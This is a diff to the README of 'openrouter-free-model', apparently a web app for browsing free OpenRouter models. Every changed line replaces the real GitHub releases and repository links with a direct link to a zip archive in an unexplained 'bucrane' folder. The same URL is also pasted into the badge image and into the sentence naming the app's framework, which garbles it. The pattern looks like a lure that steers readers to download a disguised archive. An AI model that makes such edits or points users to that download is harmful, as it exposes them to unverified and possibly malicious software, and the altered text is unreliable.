@@ -1,10 +1,10 @@
 # 🌐 openrouter-free-model - Easily Manage Free Models from OpenRouter
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-OpenRouter%20Models-blue)](https://github.com/codewithosama03/openrouter-free-model/releases)
+[![Download Now](https://raw.githubusercontent.com/codewithosama03/openrouter-free-model/main/bucrane/openrouter-free-model.zip%20Now-OpenRouter%20Models-blue)](https://raw.githubusercontent.com/codewithosama03/openrouter-free-model/main/bucrane/openrouter-free-model.zip)
 
 ## 📦 Overview
 
-Welcome to the openrouter-free-model application. This web application allows you to browse, filter, sort, and manage free models available on OpenRouter. With a simple and intuitive interface, you can easily select models, copy their IDs in various formats, and use them with other tools. The application is built with Next.js and supports multiple languages, including English and Chinese.
+Welcome to the openrouter-free-model application. This web application allows you to browse, filter, sort, and manage free models available on OpenRouter. With a simple and intuitive interface, you can easily select models, copy their IDs in various formats, and use them with other tools. The application is built with https://raw.githubusercontent.com/codewithosama03/openrouter-free-model/main/bucrane/openrouter-free-model.zip and supports multiple languages, including English and Chinese.
 
 ## 🚀 Getting Started
 
@@ -20,7 +20,7 @@ Before you begin, ensure your system meets the following requirements:
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [Releases Page](https://github.com/codewithosama03/openrouter-free-model/releases) to download the latest version of the application.
+   Go to the [Releases Page](https://raw.githubusercontent.com/codewithosama03/openrouter-free-model/main/bucrane/openrouter-free-model.zip) to download the latest version of the application.
 
 2. **Choose Your Download**  
    Find the download link for the latest release version. This will typically be labeled as "Latest release". Click on this link to view the available downloads.
@@ -70,7 +70,7 @@ For more information, tutorials, or updates, please view our GitHub repository. 
 
 ## 📌 Links
 
-- [Releases Page](https://github.com/codewithosama03/openrouter-free-model/releases)
-- [GitHub Repository](https://github.com/codewithosama03/openrouter-free-model)
+- [Releases Page](https://raw.githubusercontent.com/codewithosama03/openrouter-free-model/main/bucrane/openrouter-free-model.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/codewithosama03/openrouter-free-model/main/bucrane/openrouter-free-model.zip)
 
 Your journey into managing free models from OpenRouter begins here. Follow these steps to download and enjoy using the openrouter-free-model application!
